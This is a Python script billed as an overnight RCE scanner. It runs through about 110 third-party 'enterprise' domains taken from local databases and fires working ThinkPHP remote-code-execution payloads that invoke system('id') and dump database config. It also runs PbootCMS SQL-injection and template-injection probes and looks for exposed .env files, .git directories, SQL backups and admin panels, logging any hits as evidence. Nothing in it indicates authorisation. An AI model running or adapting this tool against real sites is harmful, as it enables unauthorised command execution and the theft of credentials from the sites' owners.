#!/usr/bin/env python3
"""
Overnight RCE Vulnerability Scanner
Targets: 110 enterprise sites from enterprise_db + old_sites_db
"""
import subprocess, json, sys, time, re
from datetime import datetime

RESULTS_FILE = "/tmp/overnight_scan_results.json"
LOG_FILE = "/tmp/overnight_scan.log"

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

def curl(url, timeout=10, method="GET", data=None, headers=None, follow=False):
    """Run curl and return (http_code, body, headers)"""
    cmd = ["curl", "-sk", "--connect-timeout", "5", "--max-time", str(timeout), "-w", "\\n%{http_code}"]
    if follow:
        cmd.append("-L")
    if method == "POST":
        cmd += ["-X", "POST"]
    if data:
        cmd += ["-d", data]
        cmd += ["-H", "Content-Type: application/x-www-form-urlencoded"]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
    cmd += ["-D", "/tmp/curl_hdr.txt"]
    cmd.append(url)
    
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        output = r.stdout
        # Split body and code
        parts = output.rsplit("\n", 1)
        if len(parts) == 2:
            body, code = parts
        else:
            body, code = output, "000"
        code = code.strip()
        
        # Read headers
        try:
            with open("/tmp/curl_hdr.txt") as f:
                hdrs = f.read()
        except:
            hdrs = ""
        
        return code, body[:2000], hdrs
    except Exception as e:
        return "000", str(e)[:200], ""

def check_thinkphp_rce(domain):
    """Test all ThinkPHP RCE POCs"""
    hits = []
    base = f"http://{domain}"
    
    # POC list: (name, url_suffix, method, data, check_pattern)
    pocs = [
        ("TP_captcha_GET", "/index.php?s=captcha&_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=id", "GET", None, "uid="),
        ("TP_captcha_POST", "/index.php?s=captcha", "POST", "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id", "uid="),
        ("TP_invokefunction", "/index.php?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1", "GET", None, "PHP Version"),
        ("TP_Container", "/index.php?s=index/think/Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id", "GET", None, "uid="),
        ("TP_Config", "/index.php?s=index/think/Config/get&name=database", "GET", None, "password"),
        ("TP_view_display", "/index.php?s=index/think/view/driver/Php/display&content=<?php phpinfo();?>", "GET", None, "PHP Version"),
        ("TP_Request_input", "/index.php?s=index/think/Request/input&filter=system&data=id", "GET", None, "uid="),
    ]
    
    for name, suffix, method, data, check in pocs:
        url = base + suffix
        code, body, hdrs = curl(url, method=method, data=data)
        if check and check in body:
            hits.append({"name": name, "url": url, "evidence": body[:300]})
            log(f"    [!] {name} HIT on {domain}")
    
    return hits

def check_pboot_vulns(domain):
    """Test PbootCMS vulnerabilities"""
    hits = []
    base = f"http://{domain}"
    
    checks = [
        ("Pboot_admin", "/admin.php", "管理中心|admin|login"),
        ("Pboot_sqli_search", "/index.php/search?keyword=test%27", "error|SQL|mysql"),
        ("Pboot_info_leak", "/info.php", "phpinfo|PHP Version"),
        ("Pboot_env", "/.env", "DB_PASSWORD|APP_KEY"),
        ("Pboot_template_inject", "/?tag={pboot:if(1)}", ""),
        ("Pboot_sqli_list", "/index.php/list/5.html%27", "error|SQL"),
        ("Pboot_upload", "/admin.php/upload", ""),
    ]
    
    for name, path, check in checks:
        url = base + path
        code, body, hdrs = curl(url)
        if code in ["200", "302"]:
            if check:
                if re.search(check, body, re.I):
                    hits.append({"name": name, "url": url, "code": code, "evidence": body[:200]})
                    log(f"    [!] {name} HIT on {domain} ({code})")
            else:
                if code == "200":
                    hits.append({"name": name, "url": url, "code": code})
                    log(f"    [*] {name} accessible on {domain}")
    
    return hits

def check_common_vulns(domain):
    """Test common vulnerabilities"""
    hits = []
    base = f"http://{domain}"
    
    checks = [
        ("env_leak", "/.env", "DB_PASSWORD|DB_HOST|APP_KEY|MAIL_PASSWORD"),
        ("phpinfo", "/phpinfo.php", "PHP Version|phpinfo"),
        ("info_php", "/info.php", "PHP Version|phpinfo"),
        ("adminer", "/adminer.php", "adminer|SQL"),
        ("phpmyadmin", "/phpmyadmin/", "phpMyAdmin"),
        ("laravel_env", "/.env", "DB_PASSWORD|APP_KEY"),
        ("laravel_debug", "/_ignition/health-check", "can_execute"),
        ("weblogic_console", "/console/login/LoginForm.jsp", "WebLogic"),
        ("swagger", "/swagger-ui.html", "swagger"),
        ("actuator", "/actuator", "status"),
        ("git_leak", "/.git/HEAD", "ref:"),
        ("backup_sql", "/backup.sql", "CREATE TABLE|INSERT INTO"),
        ("backup_zip", "/backup.zip", ""),
        ("test_php", "/test.php", "phpinfo"),
    ]
    
    for name, path, check in checks:
        url = base + path
        code, body, hdrs = curl(url)
        if code == "200":
            if check:
                if re.search(check, body, re.I):
                    hits.append({"name": name, "url": url, "evidence": body[:200]})
                    log(f"    [!] {name} HIT on {domain} - {check}")
            else:
                hits.append({"name": name, "url": url, "code": code})
                log(f"    [*] {name} 200 on {domain}")
    
    return hits

def get_headers(domain):
    """Get server headers"""
    base = f"http://{domain}"
    code, body, hdrs = curl(base + "/")
    info = {"alive": code, "headers": {}}
    for line in hdrs.split("\n"):
        if ":" in line:
            k, v = line.split(":", 1)
            k, v = k.strip().lower(), v.strip()
            if k in ["server", "x-powered-by", "set-cookie", "x-generator", "location"]:
                info["headers"][k] = v[:200]
    return info

def main():
    log("="*60)
    log("OVERNIGHT RCE SCAN STARTING")
    log("="*60)
    
    # Load targets
    targets = []
    
    # enterprise_db.json
    with open("/root/tools/enterprise_db.json") as f:
        db = json.load(f)
    for domain, info in db.items():
        if isinstance(info, dict) and "skip" not in info:
            targets.append({
                "domain": domain,
                "powered": info.get("powered", ""),
                "cms": info.get("cms", ""),
                "server": info.get("server", ""),
                "source": "enterprise_db"
            })
    
    # old_sites_db.json
    with open("/root/tools/old_sites_db.json") as f:
        old = json.load(f)
    seen = {t["domain"] for t in targets}
    for s in old.get("sites", []):
        if s["domain"] not in seen:
            targets.append({
                "domain": s["domain"],
                "powered": s.get("powered", ""),
                "cms": "",
                "server": s.get("server", ""),
                "source": "old_sites_db"
            })
            seen.add(s["domain"])
    
    log(f"Total targets: {len(targets)}")
    
    # Load previous results if any
    try:
        with open(RESULTS_FILE) as f:
            results = json.load(f)
        log(f"Loaded {len(results)} existing results")
    except:
        results = {}
    
    results["scan_start"] = datetime.now().isoformat()
    results["targets"] = {}
    
    for i, t in enumerate(targets):
        domain = t["domain"]
        log(f"[{i+1}/{len(targets)}] {domain} (powered={t['powered'][:30]}, cms={t['cms']})")
        
        entry = {
            "domain": domain,
            "powered": t["powered"],
            "cms": t["cms"],
            "server": t["server"],
            "source": t["source"],
            "alive": False,
            "headers": {},
            "thinkphp_hits": [],
            "pboot_hits": [],
            "vuln_hits": [],
            "scanned_at": datetime.now().isoformat()
        }
        
        # Quick alive check
        code, _, hdrs = curl(f"http://{domain}/", timeout=8)
        if code in ["000", ""]:
            log(f"    -> DEAD (timeout/unreachable)")
            entry["alive"] = False
            results["targets"][domain] = entry
            continue
        
        entry["alive"] = True
        entry["http_code"] = code
        
        # Get headers
        entry["headers"] = get_headers(domain)["headers"]
        
        # Run checks based on CMS
        power_lower = t["powered"].lower()
        cms_lower = t["cms"].lower()
        
        if "thinkphp" in power_lower or "thinkphp" in cms_lower:
            entry["thinkphp_hits"] = check_thinkphp_rce(domain)
        
        if "pboot" in power_lower:
            entry["pboot_hits"] = check_pboot_vulns(domain)
        
        # Always check common vulns
        entry["vuln_hits"] = check_common_vulns(domain)
        
        # Check for Laravel, Discuz, EmpireCMS etc.
        if "laravel" in power_lower or "laravel" in cms_lower:
            log(f"    [*] Laravel detected, checking .env/debug")
        
        results["targets"][domain] = entry
        
        # Save incrementally
        results["scan_progress"] = f"{i+1}/{len(targets)}"
        with open(RESULTS_FILE, "w") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        # Small delay
        time.sleep(0.5)
    
    # Summary
    total_hits = 0
    for d, e in results["targets"].items():
        hits = len(e.get("thinkphp_hits", [])) + len(e.get("pboot_hits", [])) + len(e.get("vuln_hits", []))
        if hits > 0:
            total_hits += hits
    
    log(f"\n{'='*60}")
    log(f"SCAN COMPLETE: {len(targets)} targets, {total_hits} vulnerability hits")
    log(f"Results saved to: {RESULTS_FILE}")
    log(f"{'='*60}")

if __name__ == "__main__":
    main()
